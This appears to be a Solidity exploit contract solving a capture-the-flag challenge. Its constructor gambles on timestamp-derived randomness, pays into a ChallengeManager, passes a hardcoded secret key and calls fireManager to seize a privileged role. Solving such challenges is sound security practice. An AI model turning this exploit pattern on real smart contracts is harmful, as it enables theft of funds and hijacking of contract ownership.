// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Setup, Privileged, ChallengeManager} from "src/contracts/Setup.sol";

contract ExploitPrivileged {
    Setup public setup = Setup(0xC9127177699EC634b3919c4650A800d43c5745b7);
    Privileged public privileged = Privileged(setup.privileged());
    ChallengeManager public challengeManager = ChallengeManager(setup.challengeManager());

    constructor() payable {
        uint256 gacha = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp))) % 4;
        if (gacha == 0 || gacha == 1) {
            challengeManager.approach{value: 5 ether}();
            for (uint8 i = 0; i < 4; i++) {
                challengeManager.upgradeChallengerAttribute(3, 3);
            }
            challengeManager.challengeCurrentOwner(0x494e4a55494e4a55494e4a5553555045524b45594b45594b45594b45594b4559);
            privileged.fireManager();
        } else {
            revert("Try again");
        }
    }
}
